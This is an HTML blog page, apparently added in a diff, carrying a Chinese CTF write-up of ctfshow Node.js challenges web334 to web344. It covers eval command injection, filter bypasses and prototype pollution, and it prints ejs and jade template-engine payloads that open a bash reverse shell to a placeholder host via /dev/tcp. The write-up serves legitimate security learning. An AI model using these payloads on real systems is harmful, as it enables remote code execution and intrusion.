@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html data-theme="">
+<head>
+    <!-- ! 引用文件位置-->
+    <!--引用文件位置-->
+<meta charset="utf-8">
+<title>原神，启动！！</title>
+<!--    daisyui cdn-->
+<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
+<!--     tailwindcss cdn daisyui 前置-->
+<script src="https://cdn.tailwindcss.com"></script>
+<!--    更改主题颜色-->
+<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
+<!--自动排版-->
+<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+<!--    谷歌字体库镜像-->
+<style>
+    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
+</style>
+<!--jquery-->
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<!--    fancybox-->
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
+<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+<!--highlight 代码高亮 使用hexo的不会高亮-->
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+<script>
+    hljs.highlightAll();
+</script>
+<link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<!--    自定义css-->
+
+<link rel="stylesheet" href="/css/output.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<!--    自定义js-->
+
+<script src="/js/view.js"></script>
+
+
+<script src="/js/fancybox.js"></script>
+
+<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
+<meta name="referrer" content="no-referrer"/>
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+<!--导航栏-->
+<div class="">
+    <div class="container-nav justify-center flex">
+        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
+            <div class="flex-1">
+                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
+            </div>
+            <div class="flex-none gap-2">
+                <ul class="menu menu-horizontal px-1">
+                    
+                    
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/">首页</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/archives">文章</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/about">关于</a></li>
+                        
+                    
+                    <!--<li><a href="/">Home</a></li>-->
+                    <!--<li><a href="/archives">Archive</a></li>-->
+                    <!--<li><a href="/about/">About</a></li>-->
+                    <li>
+                        <details class="dropdown">
+                            <summary>
+                                更换主题
+                            </summary>
+                            <ul tabindex="0"
+                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
+                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
+                                <!--主题选择配置，主题来自daisyui-->
+
+<li><a data-set-theme="light">Light</a></li>
+<li><a data-set-theme="dark">Night</a></li>
+<li><a data-set-theme="cupcake">Cupcake</a></li>
+<li><a data-set-theme="bumblebee">Bumblebee</a></li>
+<li><a data-set-theme="emerald">Emerald</a></li>
+<li><a data-set-theme="coporate">Corporate</a></li>
+<li><a data-set-theme="synthwave">Synthwave</a></li>
+<li><a data-set-theme="retro">Retro</a></li>
+<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
+<li><a data-set-theme="halloween">Halloween</a></li>
+<li><a data-set-theme="garden">Garden</a></li>
+<li><a data-set-theme="forest">Forest</a></li>
+<li><a data-set-theme="aqua">Aqua</a></li>
+<li><a data-set-theme="lofi">Lo-fi</a></li>
+<li><a data-set-theme="pastel">Pastel</a></li>
+<li><a data-set-theme="fantasy">Fantasy</a></li>
+<li><a data-set-theme="wireframe">Wireframe</a></li>
+<li><a data-set-theme="black">Black</a></li>
+<li><a data-set-theme="luxury">Luxury</a></li>
+<li><a data-set-theme="dracula">Dracula</a></li>
+<li><a data-set-theme="cmyk">CMYK</a></li>
+<li><a data-set-theme="autumn">Autumn</a></li>
+<li><a data-set-theme="business">Business</a></li>
+<li><a data-set-theme="acid">Acid</a></li>
+<li><a data-set-theme="lemonade">Lemonade</a></li>
+<li><a data-set-theme="night">Night</a></li>
+<li><a data-set-theme="coffee">Coffee</a></li>
+<li><a data-set-theme="winter">Winter</a></li>
+<li><a data-set-theme="dim">Dim</a></li>
+<li><a data-set-theme="nord">Nord</a></li>
+<li><a data-set-theme="sunset">Sunset</a></li>
+                            </ul>
+                        </details>
+                    </li>
+                </ul>
+                <div class="form-control">
+                    <input type="text" placeholder="Search is not yet!" class="input input-bordered w-24 md:w-auto"/>
+                </div>
+                <div class="dropdown dropdown-end">
+                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
+                        <div class="w-10 rounded-full">
+                            <img alt="Tailwind CSS Navbar component"
+                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
+                        </div>
+                    </div>
+                    <!--TODO 完成这里-->
+                    <!--<ul tabindex="0"-->
+                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
+                    <!--    <li>-->
+                    <!--        <a class="justify-between">-->
+                    <!--            Profile-->
+                    <!--            <span class="badge">New</span>-->
+                    <!--        </a>-->
+                    <!--    </li>-->
+                    <!--    <li><a>Settings</a></li>-->
+                    <!--    <li><a>Logout</a></li>-->
+                    <!--</ul>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--导航栏结束-->
+<div class="fleet">
+    <!--    嵌套位置-->
+    <!-- 博客详情 -->
+
+
+<!--Post开始-->
+<div class="fleet container-nav justify-center flex mb-16 w-full">
+    <div class="w-8/12 justify-center flex">
+        <div class="fleet-body flex-col w-full">
+            <div class="fleet-header">
+                <div class="fleet-content-header-title text-6xl">
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">web334-web344NodeJS篇</h1>
+                </div>
+                <div class="fleet-content-header-info">
+                    <span>2023/12/08 14:47:43</span>
+                </div>
+            </div>
+            <div class="divider w-full"></div>
+            <div class="fleet-content mt-8">
+                <div class="fleet-content-body">
+                    <div class="fleet-content-body-content justify-center flex w-full">
+                        
+                        <!--代码块-->
+                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
+                        
+                        <!--图片-->
+                        
+                        <article class="prose">
+                            <h1 id="题前准备"><a href="#题前准备" class="headerlink" title="题前准备"></a>题前准备</h1><p>简单了解下node.js，我对他的了解就是写过一点点的electron，然后就是老用npm来补网易云的一些插件XD。<br>语言特性了解：</p>
+<blockquote>
+<p> <a target="_blank" rel="noopener" href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/</a></p>
+</blockquote>
+<p>后面几个重量级的暂时先学会利用，等语言熟悉了再跟着复现。</p>
+<h1 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h1><h3 id="文件读取，rce拼接bypass"><a href="#文件读取，rce拼接bypass" class="headerlink" title="文件读取，rce拼接bypass"></a>文件读取，rce拼接bypass</h3><p>下载并解压相关代码：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">module.exports &#x3D; &#123;
+  items: [
+    &#123;username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;&#125;
+  ]
+&#125;;</code></pre>
+<p>尝试登录：<br>注意不要抄大写！登录之后就有flag了。</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">return users.find(function(item)&#123;
+    return name!&#x3D;&#x3D;&#39;CTFSHOW&#39; &amp;&amp; item.username &#x3D;&#x3D;&#x3D; name.toUpperCase() &amp;&amp; item.password &#x3D;&#x3D;&#x3D; password;
+  &#125;);</code></pre>
+<h1 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h1><p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695202667462-f22c6299-16be-4c6a-a338-ed41039efa4b.png" alt="image.png"><br>传入之后发现是eval函数。传入1之后返回了1 。<br>这里找一找nodejs的危险函数：<br>child_process：<a href="">http://nodejs.cn/api/child_process.html</a><br><code>child_process.exec(command[, options][, callback])</code><br>命令执行：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">require(&#39;child_process&#39;).execSync(&#39;ls&#39;);</code></pre>
+<p>payload：<code>?eval=require(&#39;child_process&#39;).execSync(&#39;tac fl00*&#39;);</code></p>
+<h1 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h1><p>加了过滤，过滤<code>exec</code>。<br>传入<code>__filename</code>读取文件位置，其他相关的变量：</p>
+<ul>
+<li>__filename - 当前 eval 代码运行的文件名</li>
+<li>__dirname - 当前 eval 代码运行的文件夹路径</li>
+<li>__line - 当前 eval 代码运行的行号</li>
+<li>__column - 当前 eval 代码运行的列号</li>
+</ul>
+<p>当然知道位置了，就可以读取文件了：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">require(&#39;fs&#39;).readFileSync(&#39;&#x2F;app&#x2F;routes&#x2F;index.js&#39;,&#39;utf-8&#39;)</code></pre>
+<p>jsbeautify一下方便阅读，发现过滤了exec和load两个关键字符</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">var express &#x3D; require(&#39;express&#39;);
+var router &#x3D; express.Router(); &#x2F;* GET home page. *&#x2F;
+router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;
+    res.type(&#39;html&#39;);
+    var evalstring &#x3D; req.query.eval;
+    if (typeof(evalstring) &#x3D;&#x3D; &#39;string&#39; &amp;&amp; evalstring.search(&#x2F;exec|load&#x2F;i) &gt; 0) &#123;
+        res.render(&#39;index&#39;, &#123;
+            title: &#39;tql&#39;
+        &#125;);
+    &#125; else &#123;
+        res.render(&#39;index&#39;, &#123;
+            title: eval(evalstring)
+        &#125;);
+    &#125;
+&#125;);
+module.exports &#x3D; router;</code></pre>
+<p>看了payload是通过拼接来达成运行的。</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">require(&quot;child_process&quot;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;cat flag.txt&#39;)
+&#x2F;&#x2F;(%2b就是+的url编码)
+
+require(&#39;child_process&#39;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;&quot;)</code></pre>
+<h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><p>源码：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">var express &#x3D; require(&#39;express&#39;);
+var router &#x3D; express.Router();
+var crypto &#x3D; require(&#39;crypto&#39;);
+
+function md5(s) &#123;
+  return crypto.createHash(&#39;md5&#39;)
+    .update(s)
+    .digest(&#39;hex&#39;);
+&#125;
+
+&#x2F;* GET home page. *&#x2F;
+router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;
+  res.type(&#39;html&#39;);
+  var flag&#x3D;&#39;xxxxxxx&#39;;
+  var a &#x3D; req.query.a;
+  var b &#x3D; req.query.b;
+  if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123;
+  	res.end(flag);
+  &#125;else&#123;
+  	res.render(&#39;index&#39;,&#123; msg: &#39;tql&#39;&#125;);
+  &#125;
+  
+&#125;);
+
+module.exports &#x3D; router;</code></pre>
+<p>js中有比较抽象的绕过md5方法：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag)</code></pre>
+<p>a[x]&#x3D;1&amp;b[x]&#x3D;2，数组会被解析为<code>[object Object]</code><br>测试比如：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">a&#x3D;&#123;&#39;x&#39;:&#39;1&#39;&#125;
+b&#x3D;&#123;&#39;x&#39;:&#39;2&#39;&#125;
+
+console.log(a+&quot;flag&#123;xxx&#125;&quot;)
+console.log(b+&quot;flag&#123;xxx&#125;&quot;)
+
+a&#x3D;[1]
+b&#x3D;[2]
+
+console.log(a+&quot;flag&#123;xxx&#125;&quot;)
+console.log(b+&quot;flag&#123;xxx&#125;&quot;)</code></pre>
+<p>输出如下：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">[object Object]flag&#123;xxx&#125;
+[object Object]flag&#123;xxx&#125;
+1flag&#123;xxx&#125;
+2flag&#123;xxx&#125;</code></pre>
+<h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__</a></p>
+</blockquote>
+<h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>建议直接看上面的链接文章。讲的太好了，适合我这种菜狗。<br>这里就提一段代码：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">function merge(target, source) &#123;
+    for (let key in source) &#123;
+        if (key in source &amp;&amp; key in target) &#123;
+            merge(target[key], source[key])
+        &#125; else &#123;
+            target[key] &#x3D; source[key]
+        &#125;
+    &#125;
+&#125;
+
+let o1 &#x3D; &#123;&#125;
+let o2 &#x3D; JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)
+merge(o1, o2)
+console.log(o1.a, o1.b)
+
+o3 &#x3D; &#123;&#125;
+console.log(o3.b)</code></pre>
+<p>这段代码基本就可以介绍原型链相关内容。<br>比如说这道题的：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">var secert &#x3D; &#123;&#125;;
+if(secert.ctfshow&#x3D;&#x3D;&#x3D;&#39;36dboy&#39;)&#123;
+    res.end(flag);
+  &#125;else&#123;
+    return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;+JSON.stringify(user)&#125;);  
+  &#125;</code></pre>
+<p>这里的secret就可以被原型链污染，具体在下面的<code>utils/commons</code>位置导致污染。</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">function copy(object1, object2)&#123;
+    for (let key in object2) &#123;
+        if (key in object2 &amp;&amp; key in object1) &#123;
+            copy(object1[key], object2[key])
+        &#125; else &#123;
+            object1[key] &#x3D; object2[key]
+        &#125;
+    &#125;
+  &#125;
+
+utils.copy(user,req.body);</code></pre>
+<p>这里达到了覆盖的效果。<br>我们传入payload测试一下：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code></pre>
+<p>注意，传入包的格式应该是：<code>application/json</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695215733351-c1f9a8f2-05df-4030-91aa-ab288c562189.png" alt="c6ae4a9fd8798a67b73a7fb0f6fc57ab.png"><br>但是这里我不知道为什么传入路由是<code>/login</code>而不是<code>/</code></p>
+<h1 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/#comments">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/#comments</a></p>
+</blockquote>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#x2F;* GET home page.  *&#x2F;
+router.post(&#39;&#x2F;&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;
+  res.type(&#39;html&#39;);
+  var flag&#x3D;&#39;flag_here&#39;;
+  var secert &#x3D; &#123;&#125;;
+  var sess &#x3D; req.session;
+  let user &#x3D; &#123;&#125;;
+  utils.copy(user,req.body);
+  &#x2F;&#x2F;console.log(user.query)
+  if(secert.ctfshow&#x3D;&#x3D;&#x3D;flag)&#123;
+    res.end(flag);
+  &#125;else&#123;
+    return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;+JSON.stringify(user)&#125;);  
+  &#125;
+&#125;);
+</code></pre>
+<p><code>if(secert.ctfshow===flag)&#123;</code>这里已经没办法实现了<br>那就只能找别的地方了。<br>api.js中新增的内容：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#x2F;* GET home page.  *&#x2F;
+router.post(&#39;&#x2F;&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;
+  res.type(&#39;html&#39;);
+  res.render(&#39;api&#39;, &#123; query: Function(query)(query)&#125;);
+   
+&#125;);
+</code></pre>
+<p>这其中的query也是可以被操控的，比如：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695216349714-0df19de3-93f3-4ed8-bd0a-026aa3f07205.png" alt="image.png"><br>用一下payload：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;XXX&#x2F;8888 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code></pre>
+<p>先&#x2F;login那里污染一下发包，然后再post访问一下&#x2F;api即可。<br>loginPOST传入之后，再访问就成功弹shell。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695284336857-50eb569e-f316-46b2-a781-bbeabc05a2df.png" alt="image.png"><br>flag文件在routes下login.js中<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695284375860-b8fcdfdd-2e66-4fb3-86c3-1b6a3d8f8a9a.png" alt="image.png"></p>
+<blockquote>
+<p><strong>F</strong>unction环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。</p>
+</blockquote>
+<h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>非预期的原因就是这题用了ejs模板引擎，这个模板引擎有个漏洞可以rce：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;xxx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></pre>
+<h1 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h1><p>这段核心代码是：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">this.userinfo &#x3D; new function()&#123;
+    this.isVIP &#x3D; false;
+    this.isAdmin &#x3D; false;
+    this.isAuthor &#x3D; false;     
+    &#125;;</code></pre>
+<p>这里new了一个匿名函数并赋值给userinfo。this.userinfo的__proto__属性指向的是那个匿名函数的prototype属性:</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">this.userinfo.__proto__ &#x3D;&#x3D;&#x3D; function()&#123;&#125;.prototype</code></pre>
+<p>匿名函数的prototype属性又继承自Object.prototype:</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">function()&#123;&#125;.prototype.__proto__ &#x3D;&#x3D;&#x3D; Object.prototype </code></pre>
+<p>因此：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">this.userinfo.__proto__ -&gt; function()&#123;&#125;.prototype -&gt; Object.prototype</code></pre>
+<p>因此需要套两层才能污染原型链。<br>payload：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;xxx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;&#125;</code></pre>
+<p>污染+利用<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695285797030-12a2ab9e-87d7-403e-ab5a-f00ade9779f6.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695285850316-66cf92bb-d359-4df9-9b3d-a42c9ecf10ab.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695285843000-367e1043-ce79-497f-8bb7-8c713069a44e.png" alt="image.png"></p>
+<h1 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h1><h3 id="ejs原型链污染"><a href="#ejs原型链污染" class="headerlink" title="ejs原型链污染"></a>ejs原型链污染</h3><p>payload：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;111.11.111.111&#x2F;11111 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;&#125;</code></pre>
+<p>其中的_tmp1和tmp2是为了闭合代码。<br>还是先在login中post污染，然后访问&#x2F;就可以接到shell。flag在根目录。</p>
+<h1 id="web342-web343"><a href="#web342-web343" class="headerlink" title="**web342-web343"></a>**web342-web343</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a><br><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade</a><br><a target="_blank" rel="noopener" href="https://tari.moe/p/2021/ctfshow-nodejs#fee3a3930b854ee8b473db3cf3747056">https://tari.moe/p/2021/ctfshow-nodejs#fee3a3930b854ee8b473db3cf3747056</a></p>
+</blockquote>
+<h3 id="jade"><a href="#jade" class="headerlink" title="jade"></a>jade</h3><p>改用jade了，哈哈这wp我都看不懂，太抽象了。<br>省流一下，payload：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xx&#x2F;xx 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre>
+<p>还是login污染，根目录激活。</p>
+<h1 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h1><h3 id="HPP数据污染"><a href="#HPP数据污染" class="headerlink" title="HPP数据污染"></a>HPP数据污染</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/AtesetEnginner/p/12375499.html">https://www.cnblogs.com/AtesetEnginner/p/12375499.html</a></p>
+</blockquote>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;
+  res.type(&#39;html&#39;);
+  var flag &#x3D; &#39;flag_here&#39;;
+  if(req.url.match(&#x2F;8c|2c|\,&#x2F;ig))&#123;
+  	res.end(&#39;where is flag :)&#39;);
+  &#125;
+  var query &#x3D; JSON.parse(req.query.query);
+  if(query.name&#x3D;&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;query.password&#x3D;&#x3D;&#x3D;&#39;ctfshow&#39;&amp;&amp;query.isVIP&#x3D;&#x3D;&#x3D;true)&#123;
+  	res.end(flag);
+  &#125;else&#123;
+  	res.end(&#39;where is flag. :)&#39;);
+  &#125;
+
+&#125;);</code></pre>
+<p><code>?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code>逗号会被过滤。url</p>
+<blockquote>
+<p>node.js处理的特点和JSON.parse，另外一个点就是req.url是经过url编码的、</p>
+</blockquote>
+<p>但是%2c中的2c也被过滤掉了。<br>HTTP协议中允许同名参数出现多次，不同服务端对同名参数处理都是不一样的。<br>nodejs处理传入数组时，不像php那样，后面get传的query值会覆盖前面的，而是会把这些值都放进一个数组中。而JSON.parse居然会把数组中的字符串都拼接到一起，再看满不满足格式，满足就进行解析。<br>也即是如下payload：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125;</code></pre>
+<blockquote>
+<p>这里把c进行url编码，是因为双引号的url编码是 %22，和c连接起来就是 %22c，会匹配到正则表达式。</p>
+</blockquote>
+<p>（这里始终没理解，有2c的话不就直接寄了吗？怎么能传进去。）</p>
+<h2 id="传入解析"><a href="#传入解析" class="headerlink" title="传入解析"></a>传入解析</h2><pre class="language-javascript" data-language="javascript"><code class="language-javascript">Web服务器 　　　　　　 参数获取函数 　　　　　　　　　　   获取到的参数
+
+PHP&#x2F;Apache　　 　　  $_GET(“par”) 　　　　　　　　　　 Last
+
+JSP&#x2F;Tomcat 　　　　  Request.getParameter(“par”)    First
+
+Perl(CGI)&#x2F;Apache 　 Param(“par”) 　　　　　　　　　　 First
+
+Python&#x2F;Apache 　　  getvalue(“par”) 　　　　　　　　  All(List)
+
+ASP&#x2F;IIS 　　　　　　 Request.QueryString(“par”) 　　 All (comma-delimited string)</code></pre>
+
+                        </article>
+                    </div>
+
+
+                    <div class="fleet-content-body-footer">
+                        <!--翻页器-->
+                        <div class="flex-row flex w-full justify-between">
+                            <div class="fleet-content-body-footer-left">
+                                
+                                    <div><a href="/posts/280f6913/"
+                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                            </svg>
+                                            <div class="flex flex-col items-start"><span
+                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
+                                                <span>web345-w</span></div>
+                                        </a></div>
+                                
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/7200c6c5/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>web311-web315phpCVE</span></div>
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
+                                            </svg>
